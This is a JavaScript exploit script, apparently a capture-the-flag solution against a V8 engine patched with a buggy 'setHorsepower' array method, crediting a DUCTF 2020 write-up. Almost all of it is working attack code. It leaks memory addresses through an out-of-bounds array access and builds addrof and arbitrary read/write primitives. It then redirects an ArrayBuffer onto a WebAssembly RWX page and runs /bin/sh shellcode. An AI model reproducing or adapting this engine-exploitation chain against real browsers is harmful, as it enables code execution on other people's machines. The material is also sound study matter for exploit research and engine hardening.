// with thanks to: https://seb-sec.github.io/2020/09/28/ductf2020-pwn-or-web.html
// ^ if you're the author of this, please fix the t[]/tmp_arr[] inconsistency in the arb_* functions
//
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}
function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
function hex(val) { // typeof(val) = BigInt
    return '0x'+val.toString(16);
}
function LO32(val) { // BigInt -> BigInt
    return val & 0xffffffffn;
}
function HI32(val) { // BigInt -> BigInt
    return val >> 32n;
}

// get leaks
var float_arr = [1.1, 1.2, 1.3];
var obj_arr = [{A:1}, {B:2}, {C:3}];
var OLEN = float_arr.length;

float_arr.setHorsepower(OLEN+2);
var float_map_addr = ftoi(float_arr[OLEN]);
var float_elems_addr = ftoi(float_arr[OLEN+1]);

// primitives
// note that obj_arr.elements == float_elems_addr+0x30n.
var objOFF = 0x30/0x8;
float_arr.setHorsepower(objOFF+1);
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(float_arr[objOFF]);
}
/*
console.log(hex(addrof(float_arr)));
console.log(hex(addrof(obj_arr)));
*/
var float_arr_addr = addrof(float_arr);
console.log('&float_arr:', hex(float_arr_addr));
function arb_r(addr) { //BigInt -> BitInt
    if (addr % 2n == 0) addr += 1n;
    //
    var tmp = [1.1];
    tmp.setHorsepower(3);
    tmp[2] = itof(addr-0x8n); // Note that arr[0] refers to arr->elements[1].
    return ftoi(tmp[0]);
}

//%DebugPrint(float_arr);
//console.log('float_arr.map:', hex(arb_r(float_arr_addr))); // note that I'm intentionally using the compressed pointer + the HI32 bits of garbage, because it will set the array length correctly that way
function arb_w(addr, val) { //(BigInt, BigInt)
    if (addr % 2n == 0) addr += 1n;
    //
    var tmp = [1.1];
    tmp.setHorsepower(3);
    tmp[2] = itof(addr-0x8n);
    tmp[0] = itof(val);
}

// writing into wasm
var buf = new ArrayBuffer(0x100);
var uint8_arr = new Uint8Array(buf);
/* Find the backing store ptr
%DebugPrint(buf);
let buf_addr = addrof(buf);
for (let i = 0n; i < 15n; i++)
    console.log(i, hex(arb_r(buf_addr+i*8n)));
> 12 0x55f0a7914890
*/
var backing_store_deref = addrof(buf)+12n*8n;

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_func = wasm_instance.exports.main;
/* Find the rwx ptr
%DebugPrint(wasm_instance);
let buf_addr = addrof(wasm_instance);
for (let i = 0n; i < 15n; i++)
    console.log(i, hex(arb_r(buf_addr+i*8n)));
0 0x804222d082454d1
1 0x380000000804222d
2 0x1000000007f47
3 0xffff00000000
4 0x5000000000
5 0x804222d0000156e
6 0x557e505743d0
7 0x804222d
8 0x0
9 0x0
10 0x0
11 0x557e505743f0
12 0x156e00000000
13 0x155638d23000 <-- page aligned; this is the rwx addr
14 0x8086561080863d1
*/
let rwx_addr = arb_r(addrof(wasm_instance)+8n*13n);
arb_w(backing_store_deref, rwx_addr);
// ', '.join(hex(v) for v in sh())
var shellcode = [0x31, 0xf6, 0x56, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53, 0x54, 0x5f, 0xf7, 0xee, 0xb0, 0x3b, 0xf, 0x5];
for (let i = 0; i < shellcode.length; i++) {
    uint8_arr[i] = shellcode[i];
}
console.log('executing shellcode!')
wasm_func();
